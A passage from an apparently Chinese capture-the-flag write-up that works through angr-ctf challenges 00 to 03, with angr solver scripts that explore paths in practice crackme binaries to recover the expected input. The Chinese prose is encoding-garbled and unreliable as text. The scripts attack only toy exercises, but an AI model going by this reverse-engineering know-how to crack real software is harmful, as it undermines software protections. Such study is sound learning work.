è·å–ç»™å®šåœ°å€æ‰€åœ¨çš„<strong>åŸºæœ¬å—</strong>â€”â€”ä¸€ä¸ª <code>Block</code> ç±»å®ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry) <span class="hljs-comment"># extract the basic block</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.pp() <span class="hljs-comment"># pretty-print of disassemble code of the block</span><br>        _start:<br><span class="hljs-number">401060</span>  endbr64<br><span class="hljs-number">401064</span>  xor     ebp, ebp<br><span class="hljs-number">401066</span>  mov     r9, rdx<br><span class="hljs-number">401069</span>  pop     rsi<br><span class="hljs-number">40</span>106a  mov     rdx, rsp<br><span class="hljs-number">40</span>106d  <span class="hljs-keyword">and</span>     rsp, <span class="hljs-number">0xfffffffffffffff0</span><br><span class="hljs-number">401071</span>  push    rax<br><span class="hljs-number">401072</span>  push    rsp<br><span class="hljs-number">401073</span>  lea     r8, [__libc_csu_fini]<br><span class="hljs-number">40</span>107a  lea     rcx, [__libc_csu_init]<br><span class="hljs-number">401081</span>  lea     rdi, [main]<br><span class="hljs-number">401088</span>  call    qword ptr [<span class="hljs-number">0x403fe0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions <span class="hljs-comment"># instructions in the block</span><br><span class="hljs-number">12</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs <span class="hljs-comment"># addr of each instruction</span><br>(<span class="hljs-number">4198496</span>, <span class="hljs-number">4198500</span>, <span class="hljs-number">4198502</span>, <span class="hljs-number">4198505</span>, <span class="hljs-number">4198506</span>, <span class="hljs-number">4198509</span>, <span class="hljs-number">4198513</span>, <span class="hljs-number">4198514</span>, <span class="hljs-number">4198515</span>, <span class="hljs-number">4198522</span>, <span class="hljs-number">4198529</span>, <span class="hljs-number">4198536</span>)<br></code></pre></td></tr></table></figure><h5 id="II-state-æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€">II. state - æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€</h5><p>angr ä½¿ç”¨ <code>SimState</code> ç±»è¡¨ç¤ºä¸€ä¸ª <em>æ¨¡æ‹Ÿçš„ç¨‹åºçŠ¶æ€</em>  ï¼ˆsimulated program stateï¼‰ï¼Œæˆ‘ä»¬çš„å„ç§æ“ä½œå®é™…ä¸Šæ˜¯ç”±ä¸€ä¸ª state æ­¥è¿›åˆ°å¦ä¸€ä¸ª state çš„è¿‡ç¨‹</p><p>æˆ‘ä»¬ä½¿ç”¨ <code>project.factory.entry_state()</code> è·å–ä¸€ä¸ªç¨‹åºçš„åˆå§‹æ‰§è¡ŒçŠ¶æ€ï¼Œä½¿ç”¨ <code>project.factory.blank_state(addr)</code> è·å–ä¸€ä¸ªç¨‹åºä»æŒ‡å®šåœ°å€å¼€å§‹æ‰§è¡Œçš„ç©ºç™½çŠ¶æ€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<br><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.blank_state(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure><ul><li><code>state.regs</code>ï¼šå¯„å­˜å™¨çŠ¶æ€ç»„ï¼Œå…¶ä¸­æ¯ä¸ªå¯„å­˜å™¨éƒ½ä¸ºä¸€ä¸ª  <em>ä½å‘é‡</em>  ï¼ˆBitVectorï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯„å­˜å™¨åç§°æ¥è®¿é—®å¯¹åº”çš„å¯„å­˜å™¨ï¼ˆä¾‹å¦‚ <code>state.regs.esp -= 12</code> ï¼‰</li><li><code>state.mem</code>ï¼šè¯¥çŠ¶æ€çš„å†…å­˜è®¿é—®æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ <code>state.mem[addr].type</code> å®Œæˆå†…å­˜è®¿é—®ï¼ˆä¾‹å¦‚ <code>state.mem[0x1000].long = 4</code> ï¼Œå¯¹äºè¯»è€Œè¨€è¿˜éœ€æŒ‡å®š <code>.resolved</code> æˆ– <code>.concrete</code> è¡¨ç¤ºä½å‘é‡æˆ–æ˜¯å®é™…å€¼ï¼Œä¾‹å¦‚ <code>state.mem[0x1000].long.concrete</code>ï¼‰</li><li><code>state.memory</code>ï¼šå¦ä¸€ç§å½¢å¼çš„å†…å­˜è®¿é—®æ¥å£ï¼š<ul><li><code>state.memory.load(addr, size_in_bytes)</code> ï¼šè·å–è¯¥åœ°å€ä¸ŠæŒ‡å®šå¤§å°çš„ä½å‘é‡</li><li><code>state.memory.store(addr, bitvector)</code> ï¼šå°†ä¸€ä¸ªä½å‘é‡å­˜å‚¨åˆ°æŒ‡å®šåœ°å€</li></ul></li><li><code>state.posix</code>ï¼šPOSIX ç›¸å…³çš„ç¯å¢ƒæ¥å£ï¼Œä¾‹å¦‚ <code>state.posix.dumps(fileno)</code> è·å–å¯¹åº”æ–‡ä»¶æè¿°ç¬¦ä¸Šçš„æµ</li></ul><p>é™¤äº†è¿™äº›å¯¹æ¨¡æ‹Ÿæ‰§è¡ŒçŠ¶æ€çš„ä¿¡æ¯è·å–æ¥å£å¤–ï¼Œè¿˜æœ‰ä¸€äº›è§£å†³æ–¹æ³•çš„å¯¹åº”æ¥å£ <code>state.solver</code>ï¼Œæˆ‘ä»¬å°†åœ¨åç»­è¿›è¡Œè®²è§£</p><h5 id="III-simulation-manager-æ¨¡æ‹Ÿæ‰§è¡Œå™¨">III. simulation_manager - æ¨¡æ‹Ÿæ‰§è¡Œå™¨</h5><p>angr å°†ä¸€ä¸ªçŠ¶æ€çš„æ‰§è¡Œæ–¹æ³•ç‹¬ç«‹æˆä¸€ä¸ª <code>SimulationManager</code> ç±»ï¼Œä»¥ä¸‹ä¸¤ç§å†™æ³•ç­‰æ•ˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simgr(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.factory.simulation_manager(state)<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<br></code></pre></td></tr></table></figure><ul><li><code>simgr.step()</code>ï¼š<strong>ä»¥åŸºæœ¬å—ä¸ºå•ä½</strong>çš„å•æ­¥æ‰§è¡Œ</li><li><code>simgr.explore(addr)</code>ï¼šè·¯å¾„æ¢ç´¢ï¼Œå³<strong>æ‰§è¡Œåˆ°æŒ‡å®šåœ°å€</strong>å¹¶è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œå°†æ‰§è¡Œå®Œæˆçš„çŠ¶æ€æ”¾åœ¨ <code>simgr.found</code> åˆ—è¡¨ä¸­ï¼Œè‹¥æ— æ³•æ±‚è§£åˆ™è¯¥åˆ—è¡¨ä¸ºç©º</li></ul><h3 id="FINAL-EXPLOIT">FINAL EXPLOIT</h3><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å·²ç»äº†è§£äº† angr çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•äº†ï¼Œè€Œæœ¬é¢˜æˆ‘ä»¬åªéœ€è¦æ¢ç´¢åˆ°å¯¹åº”è·¯å¾„å³å¯ï¼Œäºæ˜¯æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./00_angr_find&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F0</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    simgr.explore(find = obj_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>ä¸€ä¸‹å°±è·‘å‡ºæ¥äº†ï¼Œå¾ˆå¿«å•Š.mp4</p><p><img src="https://s2.loli.net/2022/10/31/BXmxhVOWjQdDwoE.png" alt="image.png"></p><h2 id="01-angr-avoidï¼šè·¯å¾„é¿å…">01_angr_avoidï¼šè·¯å¾„é¿å…</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œå‘ç°å¤ªå¤§äº†ï¼ˆæµæ±—é»„è±†.jpgï¼‰</p><p><img src="https://s2.loli.net/2022/10/31/sKdFIweu56Sya9H.png" alt="image.png"></p><p>é‚£è¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨åˆ†æä¸€ä¸‹ï¼Œmain çš„é€»è¾‘è¿˜æ˜¯æƒ¯ä¾‹è¯»å…¥ 8 å­—ç¬¦ä½œä¸º s1ï¼Œè€Œ s2 æ˜¯ä¸€ä¸ªå›ºå®šå€¼çš„å­—ç¬¦ä¸²ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/xJFCTN5OZVsjnkG.png" alt="image.png"></p><p>ä¹‹åå¤§æ¦‚å°±æ˜¯ä¼šå¯¹ s1ã€s2 è¿›è¡Œä¸€å®šå¤„ç†å¹¶åœ¨å„ç§ä»£ç å—é—´è·³è½¬ï¼Œæœ‰çš„è·¯å¾„ä¸Šä¼šè°ƒç”¨åˆ° <code>avoid_me()</code> ï¼Œæœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>maybe_good()</code> ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/fRWJnZhMtyD5qo6.png" alt="image.png"></p><p>é‚£ä¹ˆ <code>maybe_good()</code> å‡½æ•°çœ‹æ ·å­åº”è¯¥æ˜¯æˆ‘ä»¬æœ€ç»ˆè¦æ±‚è§£çš„è·¯å¾„ç»ˆç‚¹ï¼Œåªè¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š1ï¼‰<code>should_succeed != 0</code> 2ï¼‰<code>s1 == s2</code> ä¾¿è¯´æ˜æˆ‘ä»¬æˆåŠŸäº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/6d8uNkXWAoR1PM7.png" alt="image.png"></p><p>è€Œ <code>avoid_me()</code>ä¼šå°†å˜é‡ <code>should_succeed</code> ç½® 0ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åœ¨æ‰§è¡Œæ—¶åº”è¯¥é¿å…è°ƒç”¨äº†è¯¥å‡½æ•°çš„è·¯å¾„ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/dQs5x4cuhTl2AzD.png" alt="image.png"></p><p>å¦‚æœç¡¬é€†çš„è¯é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼ˆ<s>åæ­£ğŸ‘´è‚¯å®šä¸æ„¿æ„æ‰‹åŠ¨é€†</s>ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ angr è¿›è¡Œæ±‚è§£ï¼Œç›®æ ‡è·¯å¾„è¿˜æ˜¯è¾“å‡º <code>&quot;Good Job.&quot;</code>ï¼Œä¸è¿‡è¿™ä¸€é¢˜æˆ‘ä»¬å¤šäº†ä¸€ä¸ªçº¦æŸï¼šé¿å¼€ <code>avoid_me()</code> å‡½æ•°çš„æ‰§è¡Œ</p><p>å¦‚æœæˆ‘ä»¬ä¸é¿å¼€è¿™ä¸ªè¿‘ä¹æ— å¤„ä¸åœ¨çš„ <code>avoid_me()</code> å‡½æ•°ï¼Œåˆ™ä¼šé€ æˆ<strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼ˆPath Explosionï¼‰ï¼Œä»è€Œå¤§å¹…åº¦å¢åŠ æ±‚è§£æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨è·¯å¾„çº¦æŸçš„æ±‚è§£ä¸Šé¿å¼€è¯¥å‡½æ•°</p><h3 id="simgr-explore-çš„åŸºæœ¬ç”¨æ³•">simgr.explore() çš„åŸºæœ¬ç”¨æ³•</h3><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨æ¨¡æ‹Ÿå™¨çš„ <code>.explore()</code> æ–¹æ³•æ¥è¿›è¡Œè·¯å¾„æ¢ç´¢ï¼Œä¼ å…¥çš„é»˜è®¤å‚æ•°ä¸º <code>find</code>â€”â€”ä¸€ä¸ª/ä¸€ç»„ä»¤æ¨¡æ‹Ÿå™¨ç»ˆæ­¢è¿è¡Œçš„åœ°å€ï¼Œç¬¦åˆçš„æ‰§è¡ŒçŠ¶æ€ç»“æœä¼šè¢«æ”¾åˆ° <code>.found</code> åˆ—è¡¨ä¸­</p><p>ä½†é™¤äº† <code>find</code> å‚æ•°å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®š <code>avoid</code> å‚æ•°â€”â€”æ¨¡æ‹Ÿå™¨è¿è¡Œä¸­åº”å½“è¦<strong>é¿å¼€</strong>çš„åœ°å€ï¼Œå½“ä¸€ä¸ªçŠ¶æ€æ‰§è¡Œåˆ°è¿™æ ·çš„åœ°å€æ—¶ï¼Œå…¶ä¼šè¢«æ”¾åœ¨ <code>.avoided</code> åˆ—è¡¨ä¸­å¹¶ä¸å†å¾€åæ‰§è¡Œ</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡å®š <code>num_find</code> å‚æ•°æ¥æŒ‡å®šéœ€è¦å¯»æ‰¾çš„è§£çŠ¶æ€çš„æ•°é‡ï¼Œè‹¥æœªæŒ‡å®šåˆ™ä¼šåœ¨ <code>.found</code> åˆ—è¡¨ä¸­å­˜å‚¨æ‰€æœ‰çš„è§£çŠ¶æ€</p><h3 id="FINAL-EXPLOUT">FINAL EXPLOUT</h3><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“è¯¥å¦‚ä½•è¿›è¡Œè·¯å¾„é¿å…äº†ï¼Œäºæ˜¯æœ€åçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./01_angr_avoid&#x27;</span><br>    proj = angr.Project(bin_path) <span class="hljs-comment"># load the binary file</span><br>    init_state = proj.factory.entry_state() <span class="hljs-comment"># create an empty context</span><br>    simgr = proj.factory.simgr(init_state) <span class="hljs-comment"># create a simulator_manager</span><br>    obj_path_addr = <span class="hljs-number">0x80492F8</span> <span class="hljs-comment"># the path we&#x27;d like to explore</span><br>    avoid_path_addr = <span class="hljs-number">0x80492BB</span> <span class="hljs-comment"># the path that we need to avoid</span><br>    simgr.explore(find = obj_path_addr, avoid = avoid_path_addr) <span class="hljs-comment"># start to explore</span><br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># print the input that solve the constraint</span><br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ä¸€ä¸‹å­å°±å‡ºæ¥äº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/wfTengqWBDoRisK.png" alt="image.png"></p><blockquote><p>ç¬”è€…å®é™…è·‘äº†ä¸€ä¸‹ä¸é¿å¼€è¯¥çº¦æŸçš„æ±‚è§£åœºæ™¯ï¼Œå·¨<s>â„¢</s>æ…¢ï¼Œ<s>ç›´æ¥æŠŠğŸ‘´ã®é˜¿é‡Œâ˜å­¦ç”ŸğŸ“ç»™ç‚¸äº†</s></p></blockquote><h2 id="02-angr-find-conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶">02_angr_find_conditionï¼šè‡ªå®šä¹‰æœç´¢æ¡ä»¶</h2><p>æƒ¯ä¾‹åœ°æ‹–å…¥ IDAï¼Œ<strong>ä¼¼ä¹</strong>é€»è¾‘å’Œç¬¬ä¸€é“é¢˜å·®ä¸å¤šï¼Œ<code>complex_function()</code> ä¹Ÿæ²¡å•¥æ”¹å˜è¿™é‡Œå°±ä¸è´´äº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/uFaZBR6c31KHbx5.png" alt="image.png"></p><p>ä½†ä¸€çœ‹æ±‡ç¼–å°±æµæ±—é»„è±†äº†ï¼Œ<strong>å› ä¸ºå®é™…ä¸Šå­˜åœ¨éå¸¸å¤šçš„ä¼ªè·¯å¾„</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/McqmdiDI2jXLE1f.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/vhqK89csVgQ3dZz.png" alt="image.png"></p><p><strong>å¹¶ä¸”æœ‰ç€éå¸¸å¤šçš„è¾“å‡º Good Job å­—ç¬¦ä¸²çš„åŸºæœ¬å—</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/fq8Gy3AHdLEXJ51.png" alt="image.png"></p><p>å¦‚æœä½ åªæ˜¯ç®€å•çœ‹äº†ä¸€ä¸‹ç„¶åéšä¾¿é€‰äº†ä¸€ä¸ªï¼ˆæ¯”å¦‚è¯´çœ‹åˆ°ç¬¬ä¸€ä¸ªç›´æ¥é€‰ï¼‰æ‰”è¿› angr é‡Œæ±‚è§£ï¼Œ<strong>é‚£å°±å¯„äº†</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/ZxejJwIW8TRGlD9.png" alt="image.png"></p><p>æ€ä¹ˆåŠå‘¢ï¼Ÿç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ‰‹åŠ¨å†åˆ†æä¸€ä¸‹è¿™äº›ä¼ªè·¯å¾„ï¼Œä½†æ˜¯è¿™å°±ä¸ç¬¦åˆæˆ‘ä»¬ä½¿ç”¨ angr çš„è‡ªåŠ¨æ±‚è§£æ€æƒ³äº†ï¼šï¼‰å› æ­¤æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ç§èƒ½å¤Ÿé¿å¼€è¿™äº›è·¯å¾„çš„æ–¹æ³•</p><h3 id="simgr-explore-çš„æ‰©å±•ç”¨æ³•">simgr.explore() çš„æ‰©å±•ç”¨æ³•</h3><p>å®é™…ä¸Š <code>explore()</code> çš„å‚æ•° <code>find</code> ä¸ <code>avoid</code> é™¤äº†å¯ä»¥æ˜¯ç›®æ ‡åœ°å€å¤–ï¼Œ<strong>è¿˜å¯ä»¥æ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼Œå‚æ•°ä¸ºæ¨¡æ‹ŸçŠ¶æ€ï¼Œè¿”å›å€¼ä¸ºåˆ¤å®šæ¡ä»¶çš„å¸ƒå°”å€¼</strong></p><ul><li>å³æˆ‘ä»¬å¯ä»¥ç¼–å†™è‡ªå®šä¹‰å‡½æ•°æ¥åˆ¤æ–­ä¸€ä¸ªçŠ¶æ€æ˜¯å¦æ˜¯æˆ‘ä»¬åº”å½“è¦å¯»æ‰¾çš„çŠ¶æ€</li></ul><p>ä¾‹å¦‚ï¼Œè‹¥æ˜¯æˆ‘ä»¬æƒ³è¦å¯»æ‰¾ä¸€æ¡è¾“å‡ºæŒ‡å®šå­—ç¬¦ä¸²çš„è·¯å¾„ï¼Œå¯ä»¥é€‰æ‹©é€šè¿‡åˆ¤æ–­è¯¥å­—ç¬¦ä¸²æ˜¯å¦åœ¨è¾“å‡ºä¸­çš„æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>state.posix.dumps(æ–‡ä»¶æè¿°ç¬¦)</code> æ¥è·å–å¯¹åº”æ–‡ä»¶æè¿°ç¬¦ä¸Šçš„å­—ç¬¦æµï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>) <span class="hljs-comment"># 1 for stdout</span><br><span class="hljs-comment"># ...</span><br>simgr.explore(find = foo)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOUT-2">FINAL EXPLOUT</h3><p>é‚£ä¹ˆè§£é¢˜æ€è·¯å°±æ¸…æ™°äº†ï¼Œæˆ‘ä»¬å°†æ±‚è§£çš„ç›®æ ‡è·¯å¾„è®¾ä¸ºè¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ã€avoid è·¯å¾„è®¾ä¸ºè¾“å‡º <code>&quot;Try again.&quot;</code> å­—ç¬¦ä¸²å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    bin_path = <span class="hljs-string">&#x27;./02_angr_find_condition&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br><br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/9nVmrKZvkezSdRQ.png" alt="image.png"></p><h1>0x02. angr-ctfï¼šç¬¦å·åŒ–</h1><h2 id="03-angr-symbolic-registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨">03_angr_symbolic_registersï¼šç¬¦å·åŒ–å¯„å­˜å™¨</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œå¤§æ¦‚æ˜¯è¯»å…¥è¾“å…¥åç”¨ä¸‰ä¸ªå‡½æ•°ç®€å•ç®—ä¸€ä¸‹ï¼Œè¾“å…¥å‚æ•°æ˜¯ <code>eaxã€ebxã€edx</code> å¯„å­˜å™¨çš„å€¼ï¼Œä¸‰ä¸ªç»“æœéƒ½ä¸º 0 å°±ğŸ†—äº†ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/Yze2DrmB6a1owTQ.png" alt="image.png"></p><p>åœ¨ <code>get_user_input()</code> é‡Œä¼šåˆ†åˆ«è¯»ä¸‰ä¸ªæ•°åˆ° <code>eaxã€ebxã€edx</code> å¯„å­˜å™¨ä¸­ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/2n6murUotEjVgCi.png" alt="image.png"></p><blockquote><p>ç„¶åä½ ä¼šå‘ç°åç¼–è¯‘çš„ç»“æœå°±æ˜¯ä¸ªğŸ“â‘§â€¦ğŸ‘´åˆšçœ‹åç¼–è¯‘çš„ä¼ªä»£ç è¿˜æƒ³äº†åŠå¤©ä¸ºå•¥è¦å¤šè¯»ä¸¤ä¸ªæ•°ç„¶åæ‰”æ‰</p><p><img src="https://s2.loli.net/2022/10/31/DoxlVIvprB4KATb.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/10/31/8poqhHj2W1gi6lk.png" alt="image.png"></p></blockquote><p>ç„¶åä½ ä¼šå‘ç°ç”¨ä¸Šä¸€é¢˜çš„è„šæœ¬ä¹Ÿèƒ½ç§’è§£â€¦ä¸è¿‡è¿™æ ·å°±ä¸æ˜¯è¿™é“é¢˜å‡ºé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><p>é‡æ–°è¯»ä¸€ä¸‹é¢˜ç›®â€”â€”<code>symbolic registers</code>ï¼Œè¿™æ„å‘³ç€<strong>æœ¬é¢˜æˆ‘ä»¬åº”å½“å°†è¿™ä¸‰ä¸ªå¯„å­˜å™¨è®¾ç½®ä¸ºç¬¦å·å˜é‡æ¥è¿›è¡Œçº¦æŸæ±‚è§£</strong></p><h3 id="Claripy-angr-çš„æ±‚è§£å¼•æ“">Claripy - angr çš„æ±‚è§£å¼•æ“</h3><p><code>Claripy</code> æ˜¯ angr çš„<strong>æ±‚è§£å¼•æ“</strong>ï¼ˆsolver engineï¼‰ï¼Œå…¶å†…éƒ¨ä¼šæ— ç¼æ··åˆä½¿ç”¨å‡ ç§åç«¯ï¼ˆconcrete bitvectorsã€SAT solvers ç­‰ï¼‰ï¼Œå¯¹äºæˆ‘ä»¬è€Œè¨€ä¸€èˆ¬ä¸éœ€è¦ç›´æ¥ä¸å…¶è¿›è¡Œäº¤äº’ï¼Œä½†é€šå¸¸æˆ‘ä»¬ä¼šä½¿ç”¨å…¶æä¾›çš„ä¸€äº›æ¥å£</p><h4 id="bitvector-ä½å‘é‡">bitvector - ä½å‘é‡</h4><p><strong>ä½å‘é‡</strong>ï¼ˆbitvectorï¼‰æ˜¯ angr æ±‚è§£å¼•æ“ä¸­çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ï¼Œå…¶è¡¨ç¤ºäº† <strong>ä¸€ç»„ä½</strong> ï¼ˆa sequence of bitsï¼‰</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>claripy.BVV(int_value, size_in_bits)</code> æˆ– <code>claripy.BVV(string_value)</code> 